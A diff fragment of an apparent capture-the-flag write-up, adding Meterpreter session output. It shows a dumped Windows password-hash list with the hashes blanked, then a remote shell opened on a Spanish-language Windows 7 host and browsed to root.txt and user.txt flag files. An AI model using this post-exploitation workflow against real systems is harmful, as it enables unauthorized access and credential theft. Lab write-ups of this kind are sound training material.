@@ -231,7 +231,97 @@ HomeGroupUser$:1002:████████████████████
 Invitado:501:████████████████████████████████:████████████████████████████████:::
 MIKE:1001:████████████████████████████████:████████████████████████████████:::
 ```
+# We can open up the shell inside the target
+```
+meterpreter > shell
+Process 828 created.
+Channel 1 created.
+Microsoft Windows [Versi�n 6.1.7601]
+Copyright (c) 2009 Microsoft Corporation. Reservados todos los derechos.
 
+C:\Windows\system32>cd ..
+cd ..
+
+C:\Windows>cd ..
+cd ..
+
+C:\>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 44FD-46F4
+
+ Directorio de C:\
+
+14/07/2009  05:20    <DIR>          PerfLogs
+03/02/2024  13:31    <DIR>          Program Files
+14/07/2009  06:57    <DIR>          Program Files (x86)
+03/02/2024  13:31    <DIR>          Users
+03/02/2024  13:32    <DIR>          Windows
+               0 archivos              0 bytes
+               5 dirs  24.075.984.896 bytes libres
+
+C:\>cd Users
+cd Users
+
+C:\Users>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 44FD-46F4
+
+ Directorio de C:\Users
+
+03/02/2024  13:31    <DIR>          .
+03/02/2024  13:31    <DIR>          ..
+03/02/2024  13:31    <DIR>          MIKE
+12/04/2011  11:12    <DIR>          Public
+               0 archivos              0 bytes
+               4 dirs  24.075.984.896 bytes libres
+
+C:\Users>cd MIKE
+cd MIKE
+
+C:\Users\MIKE>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 44FD-46F4
+
+ Directorio de C:\Users\MIKE
+
+03/02/2024  13:31    <DIR>          .
+03/02/2024  13:31    <DIR>          ..
+03/02/2024  13:47    <DIR>          Contacts
+03/02/2024  13:50    <DIR>          Desktop
+03/02/2024  14:08    <DIR>          Documents
+03/02/2024  13:47    <DIR>          Downloads
+03/02/2024  13:47    <DIR>          Favorites
+03/02/2024  13:47    <DIR>          Links
+03/02/2024  13:47    <DIR>          Music
+03/02/2024  13:47    <DIR>          Pictures
+03/02/2024  13:47    <DIR>          Saved Games
+03/02/2024  13:47    <DIR>          Searches
+03/02/2024  13:47    <DIR>          Videos
+               0 archivos              0 bytes
+              13 dirs  24.075.984.896 bytes libres
+
+C:\Users\MIKE>cd Desktop
+cd Desktop
+
+C:\Users\MIKE\Desktop>dir
+dir
+ El volumen de la unidad C no tiene etiqueta.
+ El n�mero de serie del volumen es: 44FD-46F4
+
+ Directorio de C:\Users\MIKE\Desktop
+
+03/02/2024  13:50    <DIR>          .
+03/02/2024  13:50    <DIR>          ..
+03/02/2024  13:50                35 root.txt
+03/02/2024  13:50                35 user.txt
+               2 archivos             70 bytes
+               2 dirs  24.075.984.896 bytes libres
+
+C:\Users\MIKE\Desktop>
+```
 
 
 
